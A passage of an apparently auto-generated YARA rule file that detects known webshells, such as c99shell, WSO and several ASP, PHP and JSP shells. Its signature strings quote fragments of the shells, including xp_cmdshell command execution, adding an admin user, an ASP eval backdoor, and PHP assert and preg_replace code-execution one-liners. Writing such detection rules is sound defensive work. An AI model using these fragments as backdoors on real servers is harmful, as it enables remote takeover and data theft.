      $s9 = "ent=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - c99shell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAM" ascii
      $s10 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s11 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s12 = "  $file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";" fullword ascii
      $s13 = "m/scripts/contact.dll?msgto=656555\\\"><img src=\\\"http://wwp.icq.com/scripts/online.dll?icq=656555&img=5\\\" border=0 align=ab" ascii
      $s14 = "     echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" na" ascii
      $s15 = "  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $s16 = "e=\"text\" name=\"dump_file\" size=\"30\" value=\"<?php echo \"dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-" ascii
      $s17 = "rver).\":\".htmlspecialchars($sql_port).\" as \".htmlspecialchars($sql_login).\"@\".htmlspecialchars($sql_server).\" (password -" ascii
      $s18 = "\\\"dump\\\"><input type=\\\"hidden\\\" name=\\\"sql_db\\\" value=\\\"\".htmlspecialchars($sql_db).\"\\\"><input type=\\\"hidden" ascii
      $s19 = " $out = \"# Dumped by C99Shell.SQL v. \".$shver.\"" fullword ascii
      $s20 = " echo \"<form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule icesword_3 {
   meta:
      description = "webshell - file icesword.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8d471c18d5306c15331e366d9595b6258fb51ea28ba13c288edb06c6a9c5a7f1"
   strings:
      $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"zOVO\" CssClass=\"list\"" ascii
      $x2 = ":ListItem><asp:ListItem Value=\"Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /" ascii
      $x3 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r\\n-" ascii
      $x4 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r\\n-" ascii
      $x5 = " <td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" va" ascii
      $x6 = "Item Value=\"\">-- SQL Server Exec --</asp:ListItem><asp:ListItem Value=\"Use master dbcc addextendedproc('xp_cmdshell','xplog70" ascii
      $x7 = "<a href=\"http://hi.baidu.com/%CE%E9%D7%D3%C7%C7/home\" target=\"_blank\">" fullword ascii
      $x8 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#003300;\">Copyright &copy; 2009-201" ascii
      $x9 = "WORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\windows\\system32\\ias\\ias.mdb','select shell(&#34;cm" ascii
      $x10 = "utfile='c:\\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''\">SP_makewebtask make file</asp:Lis" ascii
      $x11 = " echo ^&lt;%execute(request(char(35)))%^>>c:\\bin.asp';\">SP_oamethod exec</asp:ListItem><asp:ListItem Value=\"sp_makewebtask @o" ascii
      $x12 = "lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='c:\\bin.asp' backup database @b" ascii
      $s13 = " <input class=\"input\" runat=\"server\" id=\"kusi\" type=\"text\" size=\"100\" value=\"c:\\windows\\system32\\cmd.exe\"/>" fullword ascii
      $s14 = " <td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" va" ascii
      $s15 = " : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssClass=\"input\" runat=\"server\"/><asp:DropDownList runat=\"ser" ascii
      $s16 = "<td ><span style=\"float:right;\"><a href=\"http://www.nftsafe.com\" target=\"_blank\">" fullword ascii
      $s17 = "td.Text=\"<a href=\\\"javascript:Bin_PostBack('urJG','\"+dt.Rows[j][\"ProcessID\"].ToString()+\"')\\\">Kill</a>\";" fullword ascii
      $s18 = "e /c net user root root/add &#34;)')\">SandBox</asp:ListItem><asp:ListItem Value=\"create table [bin_cmd]([cmd] [image]);declare" ascii
      $s19 = "Kkvb.ExecuteNonQuery();" fullword ascii
      $s20 = "<%@ Assembly Name=\"System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 200KB and
      1 of ($x*) and all of them
}

rule webshell_aspx_111 {
   meta:
      description = "webshell - file 111.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "15eed42e4904205b2ef2ff285ff1ce6c8138296c12cf075a2562c69a5fafd1cb"
   strings:
      $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"zOVO\" CssClass=\"list\"" ascii
      $x2 = ":ListItem><asp:ListItem Value=\"Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /" ascii
      $x3 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r\\n-" ascii
      $x4 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r\\n-" ascii
      $x5 = " <td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" va" ascii
      $x6 = "Item Value=\"\">-- SQL Server Exec --</asp:ListItem><asp:ListItem Value=\"Use master dbcc addextendedproc('xp_cmdshell','xplog70" ascii
      $x7 = "WORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\windows\\system32\\ias\\ias.mdb','select shell(&#34;cm" ascii
      $x8 = "utfile='c:\\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''\">SP_makewebtask make file</asp:Lis" ascii
      $x9 = " echo ^&lt;%execute(request(char(35)))%^>>c:\\bin.asp';\">SP_oamethod exec</asp:ListItem><asp:ListItem Value=\"sp_makewebtask @o" ascii
      $x10 = "lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='c:\\bin.asp' backup database @b" ascii
      $s11 = " <input class=\"input\" runat=\"server\" id=\"kusi\" type=\"text\" size=\"100\" value=\"c:\\windows\\system32\\cmd.exe\"/>" fullword ascii
      $s12 = " <td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" va" ascii
      $s13 = " : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssClass=\"input\" runat=\"server\"/><asp:DropDownList runat=\"ser" ascii
      $s14 = "td.Text=\"<a href=\\\"javascript:Bin_PostBack('urJG','\"+dt.Rows[j][\"ProcessID\"].ToString()+\"')\\\">Kill</a>\";" fullword ascii
      $s15 = "e /c net user root root/add &#34;)')\">SandBox</asp:ListItem><asp:ListItem Value=\"create table [bin_cmd]([cmd] [image]);declare" ascii
      $s16 = "Kkvb.ExecuteNonQuery();" fullword ascii
      $s17 = "<%@ Assembly Name=\"System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $s18 = "l')\">Add xp_cmdshell</asp:ListItem><asp:ListItem Value=\"Use master dbcc addextendedproc('sp_OACreate','odsole70.dll')\">Add sp" ascii
      $s19 = "nxeDR.Command+=new CommandEventHandler(this.iVk);" fullword ascii
      $s20 = "[DllImport(\"kernel32.dll\",EntryPoint=\"GetDriveTypeA\")]" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule phpshell3 {
   meta:
      description = "webshell - file phpshell3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "cbc57f72e7eb7466470260e0f41fba4210ff11041981f20fb45aa2662f1abcec"
   strings:
      $s1 = "  PHP Shell is an interactive PHP script that will execute any command" fullword ascii
      $s2 = "            /* The command is not an internal command, so we execute it after" fullword ascii
      $s3 = "             * as an internal shell command. */" fullword ascii
      $s4 = "    /* Build the command history for use in the JavaScript */" fullword ascii
      $s5 = "        /* Save the command for late use in the JavaScript.  If the command is" fullword ascii
      $s6 = "    /* Genereate a new nounce every time we preent the login page.  This binds" fullword ascii
      $s7 = "$password = isset($_POST['password']) ? $_POST['password'] : '';" fullword ascii
      $s8 = "    document.shell.command.focus();" fullword ascii
      $s9 = " * errors, unless they have been suppressed with the @-operator. */" fullword ascii
      $s10 = "      command_hist[current_line] = document.shell.command.value;" fullword ascii
      $s11 = "      document.shell.command.value = command_hist[current_line];" fullword ascii
      $s12 = "  <p>Password: <input name=\"password\" type=\"password\"></p>" fullword ascii
      $s13 = "/* Delete the session data if the user requested a logout.  This leaves the" fullword ascii
      $s14 = "  <p><input type=\"submit\" value=\"Login\"></p>" fullword ascii
      $s15 = "  href=\"http://mgeisler.net/php-shell/\">mgeisler.net/php-shell/</a>." fullword ascii
      $s16 = "  http://mgeisler.net/php-shell/ for further information." fullword ascii
      $s17 = "href=\"http://mgeisler.net/php-shell/\">mgeisler.net/php-shell/</a>." fullword ascii
      $s18 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"post\">" fullword ascii
      $s19 = "/* There are no user-configurable settings in this file anymore, please see" fullword ascii
      $s20 = " * config.php instead. */" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule webshell_asp_1d {
   meta:
      description = "webshell - file 1d.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5a1a2900ec634bb1651fff9d542491221449754289ad5a58791ee3104ccef752"
   strings:
      $s1 = "x9qAx9)PF /KwzKK~Ky~9jDlDORGq3x9R2)PyRhW/bYbGx,'~!=K+ :Xw" fullword ascii
      $s2 = "x'?s)mDkn~b0`pN+^/fgCh+!+,'~+ -mV sgC:" fullword ascii
      $s3 = "Webshell" fullword ascii
      $s4 = "0'v%m\\C/1.bwO=?4WhwW^[+M`EJ1)wwhDWT.lsPsbsn/'-k+.\\R;'-EJ*v@*k+.- E@!&C@*f-" fullword ascii
      $s5 = "qGPC=Pq2XiPo6gKR?&tA)~8 a6i,A}]fAIRSAsPR;rS}]),a!Z0T!Zi,A)ZF!\"ri1GlP[&0fR&%I~~r]fA] A6:K}HOqqGPC=PqwXi~$}IfA]O~rK:6\\O;rdr])~:Z" ascii
      $s6 = "@!z'Ubv@*lL+ qUBU'KDD[==L?5VU.vU=??$V?D)w;V^m.kaY%C7l/Mn0{Bi@!C~tLx(/2" fullword ascii
      $s7 = "<%@ LANGUAGE = VBScript.Encode %>" fullword ascii
      $s8 = "VEkn.PLP$ErY~@#@&d7?" fullword ascii
      $s9 = "xN62Dkhk.nMR[^V,P@!(D@*E@#@&I]?rZlwGWm!h+" fullword ascii
      $s10 = "0{B%l-Ckm.kaO)wEsswWDhcrJE[\"nhlO4`hlY4[rwJLS 1m:nbLJJrSJrf+^orV" fullword ascii
      $s11 = "Webshell 80sec" fullword ascii
      $s12 = "mmshell =\"" fullword ascii
      $s13 = "dpP{PU+OPAb#+.:hG+H~~OhWDOFskUl^S,YnMYhlY4l^KWM+.:bx9rsPYMO=" fullword ascii
      $s14 = "r)jWD`fSZ#P{~JxIrcBnYAxTkU+ElUWO`2S *Px~rbZ/3U?" fullword ascii
      $s15 = "@!zlLU*v@*BU'ngD'=?U?$s?D`U?=';^?DDoEssUDrwDll7ld^" fullword ascii
      $s16 = "lD+64%n1YcJz9rGA /Kxxn^DkGxrb=l[KZKxxcranx,JKDK\\r[" fullword ascii
      $s17 = "~', ):+ Z4lM/nY~xro8 2q r)jojP'~PyR]+m[:+aD): R;VKd+=kWPGF 3Xk/Dd``w1mhn#,Y4+U)9qvj21mh+*'9qvjwHCs+b[rSr[jw.=+Vk+=9Fcb[N,j2Hm:+B" ascii
      $s18 = "@!J0GxD@*Tr[KCDt[Wr^+ xmh" fullword ascii
      $s19 = "FcCdw- cldwkfcldw@!&Y9@*@!&DD@*E@#@&I]?,E@!Y.@*@!DN@*" fullword ascii
      $s20 = "ol a6v@*@!lPKUm^km0xEJ9W1Eh+UOconYAs+s+UO~Xq[cEYsB* kYz^+cNkkw^CX{BUW" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      8 of them
}

rule webshell_php_wso_404 {
   meta:
      description = "webshell - file wso_404.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "fd3db2020e82517d8fbfcc8dd3399efbdf82057353b94509995bba128030d193"
   strings:
      $x1 = "$auth_pass = \"4f4adcbf8c6f66dcfc8a3282ac2bf10a\"; //Default password is 404 . You can use http://md5online.org/md5-encrypt.html" ascii
      $s2 = "$color = \"#00ff00\"; //Default color is green. You can use http://www.somacon.com/p142.php to get the colorcode of the color yo" ascii
      $s3 = "o get the md5 of the password you wish the shell to have!" fullword ascii
      $s4 = "                $str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\"; " fullword ascii
      $s5 = "This is a private WSO Shell modification which has a \"404 Not Found\" page as it's login page. (To find the password input you " ascii
      $s6 = "            wsoSecParam('Downloaders', implode(', ',$temp)); " fullword ascii
      $s7 = "$auth_pass = \"4f4adcbf8c6f66dcfc8a3282ac2bf10a\"; //Default password is 404 . You can use http://md5online.org/md5-encrypt.html" ascii
      $s8 = "<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr> " fullword ascii
      $s9 = "        $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']); " fullword ascii
      $s10 = "    echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SE" ascii
      $s11 = "<td><input type=text name=sql_login value='\". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) .\"'></" ascii
      $s12 = "name=show_errors value=1 '.(!empty($_POST['p2'])||$_SESSION[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirec" ascii
      $s13 = "<td><input type=text name=sql_login value='\". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) .\"'></" ascii
      $s14 = "    $m = array('Sec Info'=>'SecInfo','Files'=>'FilesMan','Exec'=>'Console','Sql'=>'Sql','PHP Tools'=>'phptools','LFI'=>'lfiscan'" ascii
      $s15 = "        if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { " fullword ascii
      $s16 = "['HTTP_HOST'] . \" - WSO \" . WSO_VERSION .\"</title> " fullword ascii
      $s17 = "This is a private WSO Shell modification which has a \"404 Not Found\" page as it's login page. (To find the password input you " ascii
      $s18 = "            $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror'); " fullword ascii
      $s19 = "t type=submit value=\">>\"></form><br><span>Posix_getpwuid (\"Read\" /etc/passwd)</span><table><form onsubmit=\\'g(null,null,\"5" ascii
      $s20 = "$color = \"#00ff00\"; //Default color is green. You can use http://www.somacon.com/p142.php to get the colorcode of the color yo" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_2023_04_08 {
   meta:
      description = "webshell - file 2023-04-08.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "eeaba7421c406affcd28c59ab59fe37ab2004dc418eb113726a72c625bfd2af2"
   strings:
      $s1 = "$c=$a.$s.\"sert\";" fullword ascii
      $s2 = "$s = \"s\";" fullword ascii
      $s3 = "$a = \"a\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2022_09_0901 {
   meta:
      description = "webshell - file 2022-09-0901.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bf237a4c463f37d930a00cf1c04b1708c91a46f131b32998736814a6e4b98465"
   strings:
      $s1 = "$c(base64_decode($_COOKIE[\"PHPSESSID\"]));" fullword ascii
      $s2 = "$c=$a.$s.\"sert\";" fullword ascii
      $s3 = "$s = \"s\";" fullword ascii
      $s4 = "$a = \"a\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2022_09_09_04 {
   meta:
      description = "webshell - file 2022-09-09-04.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "da30a441f2138e5f987fb8082ac51808d077be33225aba4d89f7fa79cb44a87e"
   strings:
      $s1 = "$c(getallheaders()['Demo']);" fullword ascii
      $s2 = "$c=$a.$s.\"sert\";" fullword ascii
      $s3 = "$s = \"s\";" fullword ascii
      $s4 = "$a = \"a\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2022_09_09_03 {
   meta:
      description = "webshell - file 2022-09-09-03.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "67d166a5f0c39af02125e841812ebdbc111b0dd3c9b8134657b4be3403ca41ac"
   strings:
      $s1 = "$c($_SESSION['dmeo']);" fullword ascii
      $s2 = "$c=$a.$s.\"sert\";" fullword ascii
      $s3 = "$s = \"s\";" fullword ascii
      $s4 = "$a = \"a\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2020_08_20_07 {
   meta:
      description = "webshell - file 2020.08.20.07.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ae20b3c51394b4617112a480cfd17e73ef9ae581cd172e87ac60c2b5a42f7d2d"
   strings:
      $s1 = "    call_user_func('assert',$_POST['x']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2020_08_20_14 {
   meta:
      description = "webshell - file 2020.08.20.14.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b2eed7f75018f3026ca4072e723d1801d27debfff9065ce146b3967bfd323b7b"
   strings:
      $s1 = " payload " fullword ascii
      $s2 = "shell.php?e=preg_replace" fullword ascii
      $s3 = " POST x=phpinfo();" fullword ascii
      $s4 = "preg_replace('|.*|e',$_POST['x'],'')" fullword ascii
      $s5 = "  $arr = array($_POST['x'] => '|.*|e',);" fullword ascii
      $s6 = "  $e = $_REQUEST['e'];" fullword ascii
      $s7 = "use like:" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2020_08_20_13 {
   meta:
      description = "webshell - file 2020.08.20.13.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b0c73d7b52c553d5d90a4824cddc65c97a19c36960cc0c81460d241081aac8c2"
   strings:
      $s1 = "  $arr = array($_POST['x'] => '|.*|e',);" fullword ascii
      $s2 = "  $e = $_REQUEST['e'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_jsp_tree {
   meta:
      description = "webshell - file tree.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f273b8b90a4bbe39da1773f8dbd71ec4088d84bf8b62221531c234858375fd5e"
   strings:
      $s1 = "<script type=\"text/javascript\" src=\"jquery-easyui-1.2.3/jquery-1.4.4.min.js\"></script>" fullword ascii
      $s2 = "<script type=\"text/javascript\" src=\"jquery-easyui-1.2.3/jquery.easyui.min.js\"></script>" fullword ascii
      $s3 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";" fullword ascii
      $s4 = "<input type=\"password\" name=\"password\" size=5>" fullword ascii
      $s5 = "  <%@include file=\"/jsp/include/common.jsp\"%>" fullword ascii
      $s6 = "<script type=\"text/javascript\" src=\"jquery-easyui-1.2.3/locale/easyui-lang-zh_CN.js\"></script>" fullword ascii
      $s7 = "var nodes = $('#tt2').tree('getChecked');" fullword ascii
      $s8 = "String path = request.getContextPath();" fullword ascii
      $s9 = "<input type=\"text\" name=\"userName\"/>" fullword ascii
      $s10 = "<link rel=\"stylesheet\" type=\"text/css\" href=\"jquery-easyui-1.2.3/themes/icon.css\">" fullword ascii
      $s11 = "<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"utf-8\"%>" fullword ascii
      $s12 = "<link rel=\"stylesheet\" type=\"text/css\" href=\"jquery-easyui-1.2.3/themes/default/easyui.css\">" fullword ascii
      $s13 = "                  }" fullword ascii /* reversed goodware string '}                  ' */
      $s14 = "  </head>" fullword ascii
      $s15 = "  <head>" fullword ascii
      $s16 = "                     $('#tt2').tree('options').url = \"selectChild.action?checkid=\" + node.id;                       " fullword ascii
      $s17 = "     </script>" fullword ascii
      $s18 = "<script type=\"text/javascript\">   " fullword ascii
      $s19 = "<input type=\"button\" value=\"" fullword ascii
      $s20 = "  alert(node.id+\",\"+node.text);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 6KB and
      8 of them
}

rule oracle {
   meta:
      description = "webshell - file oracle.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1970d3f76e891d8b4948967d77736ab21ff299dcd90d458373d3fa1d69c3ac98"
   strings:
      $s1 = "    Connection conn = DriverManager.getConnection(url, username, password);" fullword ascii
      $s2 = "        ResultSet r = p.executeQuery();" fullword ascii
      $s3 = "    ResultSet rs = ps.executeQuery();" fullword ascii
      $s4 = "        out.println(\"Dumping data for table \" + table + \"...<br />\");" fullword ascii
      $s5 = "<%@ page import=\"java.sql.*\" %>" fullword ascii
      $s6 = "<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>" fullword ascii
      $s7 = "<%@ page import=\"java.util.*\" %>" fullword ascii
      $s8 = "<%@ page import=\"java.io.*\" %>" fullword ascii
      $s9 = "    String password = \"pass\";" fullword ascii
      $s10 = "out.println(\"<p><h3>finished</h3></p>\");" fullword ascii
      $s11 = "        String table=tables.get(i);" fullword ascii
      $s12 = "        tables.add(rs.getString(1));" fullword ascii
      $s13 = "             }" fullword ascii /* reversed goodware string '}             ' */
      $s14 = "    String ex=\".txt\";" fullword ascii
      $s15 = "    String url = \"jdbc:oracle:thin:user/pass@localhost:1521:orcl\";" fullword ascii
      $s16 = "    String sql_tables=\"select TABLE_NAME from user_tab_comments\";" fullword ascii
      $s17 = "                 if (col == rsmeta.getColumnCount())" fullword ascii
      $s18 = "                 if (r.getString(col) == null)" fullword ascii
      $s19 = "                     bw.append(r.getString(col));" fullword ascii
      $s20 = "             for (int col = 1; col <= rsmeta.getColumnCount(); col++) {" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 6KB and
      8 of them
}

rule webshell_asp_cmd {
   meta:
      description = "webshell - file cmd.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a35878e74425cd97ad98e3ec4b2583867bb536f4275d821cd8b82bc19380ba1a"
   strings:
      $s1 = "<%@ Assembly Name=\"System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $s2 = "<%@ Assembly Name=\"System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $s3 = "<%@ Assembly Name=\"System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $s4 = "private string GetCmd(string cmd,string shell)" fullword ascii
      $s5 = "  Response.Write(GetCmd(ok,shell));" fullword ascii
      $s6 = "<%@ import Namespace=\"System.ServiceProcess\"%>" fullword ascii
      $s7 = "<%@ import Namespace=\"System.Data.OleDb\"%>" fullword ascii
      $s8 = "<%@ Import Namespace=\"System.Data.SqlClient\"%>" fullword ascii
      $s9 = "<%@ import Namespace=\"System.Data\"%>" fullword ascii
      $s10 = "  //www.moonsec.com moon" fullword ascii
      $s11 = "<%@ import Namespace=\"System.Web.UI\"%>" fullword ascii
      $s12 = "            p.StartInfo.UseShellExecute = false;" fullword ascii
      $s13 = "  Response.Write(shell + ok );" fullword ascii
      $s14 = "<%@ Assembly Name=\"Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a\"%>" fullword ascii
      $s15 = "  string shell= Request.QueryString[\"shell\"];" fullword ascii
      $s16 = "<%@ import Namespace=\"System.Diagnostics\"%>" fullword ascii
      $s17 = "<%@ import Namespace=\"System.Runtime.InteropServices\"%>" fullword ascii
      $s18 = "<%@ Import Namespace=\"System.Threading\"%>" fullword ascii
      $s19 = "<%@ import Namespace=\"System.Text.RegularExpressions\"%>" fullword ascii
      $s20 = "<%@ import Namespace=\"System.Management\"%>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 7KB and
      8 of them
}

rule webshell_jsp_leo {
   meta:
      description = "webshell - file leo.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
   strings:
      $x1 = "Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);" fullword ascii
      $s2 = "Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
      $s4 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s5 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s6 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s7 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s8 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s9 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s10 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s11 = "sbFolder.append(\"  <a href=\\\"javascript:doForm('','\"+formatPath(list[i].getAbsolutePath())+\"','','\"+strCmd+\"','1','');" ascii
      $s12 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s13 = "<center>All Rights Reserved, <a href=\"http://blackbap.org\" target=\"_blank\">blackbap.org</a> &copy; Silic Group Inc.</center>" ascii
      $s14 = "\",\"Execute\"};" fullword ascii
      $s15 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
      $s16 = "<li><a href=\"http://www.blackbap.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
      $s17 = "<li><a href=\"http://www.blackbap.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
